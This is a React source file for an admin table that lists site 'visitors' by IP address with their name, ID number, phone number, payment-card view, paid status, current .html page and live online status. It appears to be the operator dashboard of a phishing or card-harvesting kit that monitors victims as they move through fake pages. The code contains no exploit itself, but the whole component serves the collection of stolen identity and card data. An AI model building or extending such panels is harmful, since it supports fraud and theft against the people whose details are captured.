// src/components/UserTable.js
import React from "react";

const SERVER_URL = process.env.REACT_APP_SERVER_URL || "https://YOUR-SERVER.onrender.com";

export default function UserTable({ users, cardIp, onShowCard, onShowInfo }) {
  const handleDelete = async (ip) => {
    if (!window.confirm(`حذف كل بيانات ${ip}?`)) return;
    try {
      const res = await fetch(`${SERVER_URL}/api/users/${encodeURIComponent(ip)}`, { method: "DELETE" });
      if (!res.ok) throw new Error(`Server ${res.status}`);
    } catch (err) {
      alert("Delete failed: " + err.message);
    }
  };

  const isOnline = (u) => u.currentPage && u.currentPage !== "offline";
  const sorted = Object.entries(users).sort(([, a], [, b]) => (b.lastActivityAt || 0) - (a.lastActivityAt || 0));

  return (
    <div className="table-responsive">
      <table className="table table-sm table-bordered table-hover align-middle">
        <thead className="table-dark">
          <tr>
            <th>#</th>
            <th>Name</th>
            <th>ID</th>
            <th>Phone</th>
            <th>New</th>
            <th>Card</th>
            <th>Page</th>
            <th>Status</th>
            <th>Open</th>
            <th>Del</th>
          </tr>
        </thead>
        <tbody>
          {sorted.map(([ip, u], i) => {
            const name  = u.userName || "—";
            const idNum = u.idNumber  || "—";
            const phone = u.phoneNumber || "—";
            const online = isOnline(u);
            const page   = (u.currentPage || "offline").replace(".html", "");
            const isPaid = u.hasPayment;

            return (
              <tr key={ip} style={{
                background: u.flag ? "#fff3cd" : undefined,
                boxShadow: isPaid ? "inset 4px 0 0 #28a745" : undefined,
              }}>
                <td>{i + 1}</td>
                <td style={isPaid ? { background:"#d4edda", color:"#155724", fontWeight:700 } : undefined}>
                  {name}{isPaid && <span className="badge bg-success ms-1">PAID</span>}
                </td>
                <td><small>{idNum}</small></td>
                <td><small>{phone}</small></td>
                <td>
                  <span className={`fw-bold ${u.hasNewData ? "text-success" : "text-danger"}`}>
                    {u.hasNewData ? "Yes" : "No"}
                  </span>
                </td>
                <td>
                  <button className="btn btn-success btn-sm" onClick={() => onShowCard(ip)}>Card</button>
                </td>
                <td><small>{page}</small></td>
                <td>
                  <span className={`fw-bold ${online ? "text-success" : "text-secondary"}`}>
                    {online ? "🟢" : "⚫"}
                  </span>
                </td>
                <td>
                  <button className="btn btn-primary btn-sm" onClick={() => onShowInfo(ip)}>Open</button>
                </td>
                <td>
                  <button className="btn btn-outline-danger btn-sm" onClick={() => handleDelete(ip)}>✕</button>
                </td>
              </tr>
            );
          })}
          {sorted.length === 0 && (
            <tr><td colSpan={10} className="text-center text-muted py-4">No visitors yet...</td></tr>
          )}
        </tbody>
      </table>
    </div>
  );
}
